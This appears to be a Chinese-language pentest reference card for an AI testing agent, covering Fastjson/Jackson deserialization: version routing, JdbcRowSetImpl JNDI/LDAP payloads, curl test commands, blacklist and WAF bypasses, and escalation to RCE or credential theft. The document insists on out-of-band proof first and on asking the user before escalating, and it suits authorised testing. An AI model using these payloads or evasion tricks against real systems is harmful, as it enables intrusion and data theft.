---
name: fastjson-jackson
description: Fastjson / Jackson Light Deep Card — 版本路由 / autoType 历史绕过 / Jackson polymorphic / JdbcRowSetImpl / OOB-first 验证。Java JSON 反序列化主战场。
category: vuln
tags: [java, deser, fastjson, jackson, json]
---

# Fastjson / Jackson — Light Deep Card

> **CWE**: 502 (反序列化) | **OWASP**: A08:2021 (软件和数据完整性失败) | **ROI**: 极高 (P0 — RCE)
> **轻便原则**: OOB-first,只放版本路由与关键判断;大 gadget 字典交给工具/外部库。

---

## 1. First-pass Signal

| 信号 | 判断 | 下一步 |
| :--- | :--- | :--- |
| 畸形 JSON `{ ""` 返回 `fastjson` / `autoType` / `JSONException` | Fastjson 可能 | §3 Fastjson |
| 报错含 `com.fasterxml.jackson` / `InvalidTypeIdException` | Jackson 可能 | §4 Jackson |
| Java/Spring 指纹 + JSON API | 反序列化高优先 | OOB URLDNS/JNDI 探测 |
| Content-Type JSON + 500 差异稳定 | 可疑 sink | 记录三要素后再查 Decision Card |
| 报错栈含 `parseObject` / `readValue` | sink 暴露 | 进 First-pass payload |

**禁止**: 未确认 JSON 反序列化路径前盲发 RCE payload。必须先用 DNS/OOB-only 证明可触发。

---

## 2. Attack Surface

| 入口 | 备注 |
| :--- | :--- |
| **POST JSON 接口** | 最常见,任意 `Content-Type: application/json` |
| **RESTful PATCH/PUT** | Jackson polymorphic 多见 |
| **GraphQL JSON variables** | 嵌套 JSON 入口 |
| **WebSocket 消息** | 服务端反序列化处理消息 |
| **配置导入** | "导入 JSON 配置"功能 |
| **报错栈 JSON 表单** | error 处理时反序列化 |
| **Spring `@RequestBody`** | 标准 endpoint |
| **Dubbo / RPC JSON 模式** | 微服务间调用 |
| **批量导入接口** | 上传 JSON 数组 |
| **OAuth callback JSON state** | 高级用法 |

---

## 3. Fastjson 路由

### 3.1 版本 / 行为判断

| 版本 / 行为 | 特征 | 首测 |
| :--- | :--- | :--- |
| ≤1.2.24 | autoType 默认风险高 | `JdbcRowSetImpl` DNS/JNDI |
| 1.2.25-1.2.47 | 黑名单绕过历史多 | DNS-only gadget |
| 1.2.48-1.2.68 | expectClass / 白名单场景 | 先找业务类名/报错 |
| 1.2.80+ | 默认更严 | 只在有 autoType/白名单线索时继续 |
| 1.2.83 (CVE-2022-25845) | autoType bypass 影响 | 仅 OOB 证明 |
| Fastjson2 | 默认更严 + 新 API | 看 `JSONReader.Feature.SupportAutoType` |
| 版本未知 | 只做 OOB-first | 不直接 RCE |

### 3.2 First-pass Payload 思路

- 首选 `com.sun.rowset.JdbcRowSetImpl` 指向 LDAP/DNS/OOB。
- 只验证目标是否尝试解析/连接攻击者域。
- 命中 OOB 后再按 JDK/依赖选择 gadget。

**证据格式**:
```markdown
- Endpoint: POST /api/json
- Payload class: JdbcRowSetImpl (OOB-only)
- OOB: <subdomain>
- HTTP: code=<code>, len_delta=<delta>, timing=<ms>
- Result: DNS/LDAP 回调 yes/no
```

### 3.3 常见切换

| OOB 结果 | 动作 |
| :--- | :--- |
| DNS 回调 | 证明触发,进入影响验证/HITL 确认是否升级 |
| LDAP/RMI 被封但 DNS 有 | 只报可触发外连,不强报 RCE |
| 完全无回调 | 换 OOB / 检查出站 / 转 Jackson 或普通 JSON 注入 |
| 500 + 无回调 | 可能类存在但出站失败,记录 Triage |

### 3.4 历史 CVE 时间轴

| 版本范围 | CVE / 通用名 | 状态 |
| :--- | :--- | :--- |
| ≤1.2.24 | autoType 通杀 | 工具直打 |
| 1.2.25-47 | 黑名单 + 注释绕过 (`L`, `LL` 前缀) | 工具直打 |
| 1.2.48-67 | 期望类绕过 | 需业务类知识 |
| 1.2.68-80 | 多重黑名单 + 安全模式 | 需 expectClass 链 |
| 1.2.83 | CVE-2022-25845 | OOB 验证后再上 |

---

## 4. Jackson 路由

### 4.1 触发前提

Jackson 反序列化通常需要以下任一条件:
- 启用 default typing / polymorphic deserialization
- `@JsonTypeInfo` 接收用户可控 `@type` / `class`
- API 明确接受对象类型字段
- 报错含 `InvalidTypeIdException`, `Could not resolve type id`

### 4.2 First-pass 字段

```json
{"@type":"java.lang.Object"}
{"class":"java.lang.Object"}
{"type":"java.lang.Object"}
{"@class":"java.lang.Object"}    
```

观察错误差异,不要直接上危险 gadget。

### 4.3 Gadget 方向

| 环境信号 | 方向 |
| :--- | :--- |
| Spring + Hikari/Druid | 数据源类探测 |
| JNDI 可出站 | LDAP/DNS OOB |
| commons-collections 存在 | ysoserial 系列 |
| 无依赖信息 | 仅报 polymorphic type exposure / 继续信息收集 |

### 4.4 历史 CVE

- CVE-2017-7525 / 17485 / 15095 / 2018-7489 等系列
- jackson-databind 黑名单升级史 — 每次新 CVE 加新 class 到黑名单

---

## 5. High-Value Targets

1. **业务 JSON API + Java 后端** — 最直接入口 (P0)
2. **报错栈泄露 fastjson 版本** — 直接对照版本表 (P0)
3. **配置导入功能** — JSON 反序列化高发 (P0)
4. **管理后台 PATCH/PUT** — 通常 Jackson polymorphic (P0)
5. **Webhook 接收 JSON** — 外部数据进入反序列化 (P0)
6. **Dubbo / RPC** — 内网调用 + 反序列化 (P0,通常需要 SSRF 助攻)
7. **OAuth state 含 JSON** — 高级利用 (P1)

---

## 6. Bypass Techniques

| 阻碍 | 绕过 |
| :--- | :--- |
| autoType 关闭 | expectClass 链 (找业务签收的类型) |
| 黑名单 (1.2.25+) | 注释绕过 `Lcom.sun...;` / 16 进制 `.` |
| 类名黑名单 | 类继承链 / 接口实现链 |
| Content-Type 检测 | `application/json; charset=` 变种 |
| JSON Schema 验证 | 嵌入合法字段 + autoType 类 |
| WAF 拦 `@type` | 大小写 `@Type` / 全大写 / Unicode escape |
| 类名拦 `com.sun` | 用其他可达类如 `Hikari` / `Druid` 内部类 |
| 出站 DNS 封 | HTTP OOB / SMTP OOB 协议变体 |

### 6.1 Fastjson 历史注释绕过

```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://oob/x","autoCommit":true}
```

`L` 前缀 + `;` 后缀,绕 1.2.25 黑名单。1.2.48 后失效。

---

## 7. Testing Methodology

```bash
# Step 1: 指纹确认 (Phase 1)
# 发畸形 JSON
curl -X POST https://target/api/json -H "Content-Type: application/json" -d '{"': version error → grep fastjson/jackson

# Step 2: First-pass OOB-only
curl -X POST https://target/api/json \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://test.OOB.tld/x","autoCommit":true}'

# Step 3: OOB 监听
# 看 DNS / LDAP / HTTP 回调

# Step 4: 命中后按 §3.4 / §4.4 版本路由

# Step 5: HITL 确认是否升级 RCE
```

---

## 8. Triage

| 现象 | 可能原因 | 下一步 |
| :--- | :--- | :--- |
| `autoType is not support` | Fastjson 命中但被拦 | 查版本/白名单类/业务类 |
| `ClassNotFoundException` | 类不存在但类型被解析 | 换低风险类名确认 |
| `InvalidTypeIdException` | Jackson polymorphic 入口 | 测 `@type/class/type` 字段 |
| 200 且无回调 | payload 未进入 sink / 出站封锁 | 换字段位置 / 换 OOB |
| 500 稳定 | 解析器 crash | 记录信号,谨慎升级 |
| DNS 回调但 LDAP 不通 | 出站 LDAP 端口封 | 改用 HTTP-OOB 协议 |
| 报错见 `safeMode` | Fastjson 安全模式开启 | 几乎打不开,转其他类 |

---

## 9. False Positives

| 误报 | 真实判断 |
| :--- | :--- |
| DNS 回调但是来源 IP 不是目标 | 中间 DNS resolver / 多层缓存 | 用唯一 token 子域 |
| 500 错误但与 payload 内容无关 | 服务本身 5xx 高 | 多次发,看是否 payload-correlated |
| `autoType` 字样但实际 GSON / Hutool | 不同 JSON 库报错相似 | 看完整错误栈 |
| OOB 持续被命中 | 业务侧主动 DNS 查询 | 不发 payload 也命中 → 排除 |
| Jackson polymorphic 但 type 字段被忽略 | 没启 default typing | 测其他高级 fixture |

---

## 10. Impact / 升级路径

| 链 | 终态 | Impact |
| :--- | :--- | :--- |
| OOB 命中 + RCE gadget | RCE | Critical |
| OOB 命中但 RCE 受限 | 反序列化可控 (报告 + 风险提示) | High |
| JdbcRowSetImpl LDAP → 内网 LDAP poison | LDAP 凭证窃取 | High |
| Fastjson 写文件 (老版本) | 任意写 → WebShell (HITL) | Critical |
| Jackson + Spring Hikari → DB 凭证暴露 | DB 凭证 | Critical |
| Fastjson 内网 SSRF + RCE | 内网横向 | Critical |
| 只能触发 5xx, 无外连 | 拒绝服务可疑 (低危,不直接报) | Low |

**证据 (P3.5)**:
- OOB-only 证明触发,不要直接上 RCE payload
- HITL 询问用户是否升级 RCE,默认停手
- DNS callback 子域含随机 token,可区分多次测试

---

## 11. Pro Tips

- **OOB-first 永远不变**: 老老实实先 DNS callback 证明,再考虑升级
- **Fastjson 版本看报错最稳**: 主动发畸形 JSON 看 `JSONException` 行号 → grep 对应版本
- **expectClass 链需业务类知识**: 找业务里被反序列化的 DTO,继承链回溯到 sink — 国内 Java 项目常用 `User` / `Order` / `Config` 字符串可识别
- **JdbcRowSetImpl + LDAP 标准链**: 入门第一个测;LDAP 不通试 RMI
- **safeMode 开启 = 死路**: 不要死磕,转其他类如 SQLi / 反射调用
- **Spring 内嵌 Jackson**: `@RequestBody` 默认开 polymorphic 在某些配置下 — 测 `@class` 字段
- **国内 WAF**: 对 `@type` 极敏感,Unicode escape `@type` / `\\u0040type` 一次 sweep
- **JSON 长度限制**: WAF 有时只看前 8KB,把 payload 藏在长 JSON 后部
- **Dubbo 反序列化**: 内网入口,通常配合 SSRF 触发,Phase 3 才考虑
- **fastjson 与 fastjson2 报错不同**: 看到 `com.alibaba.fastjson2.*` → fastjson2 (新,更严)

---

## 12. 工具升级线

**classic 版**:
- 综合检测: `fastjson-poc-gen` / `JsonExp` GUI 工具
- Gadget: `ysoserial.jar` + `marshalsec.jar`
- LDAP/RMI server: `marshalsec-0.0.3-SNAPSHOT-all.jar`
- OOB: `interactsh-client`

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` 一次 sweep 多版本 payload
- `mcp__yaklang__query_oob_record` 自建 interactsh 监听
- `mcp__yaklang__exec_codec` 处理 Unicode escape 链
- `mcp__yaklang__ssa_compile language="java"` + SyntaxFlow 找 `parseObject` / `readValue` sink

---

## 13. 相关参考

- 反序列化通用: [deserialize.md](deserialize.md)
- Java JNDI / Log4Shell: [jndi-log4shell.md](jndi-log4shell.md)
- Spring 生态: [spring-vuln.md](spring-vuln.md) / [../frameworks/spring-boot.md](../frameworks/spring-boot.md)
- xstream / Hessian / Dubbo: [xstream-hessian-dubbo.md](xstream-hessian-dubbo.md)
- Shiro: [shiro.md](shiro.md)
- OOB 基础设施: [../oob-infrastructure.md](../oob-infrastructure.md)
- 敏感信息利用: [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
- 级联策略: [../chained-logic-extended.md](../chained-logic-extended.md)
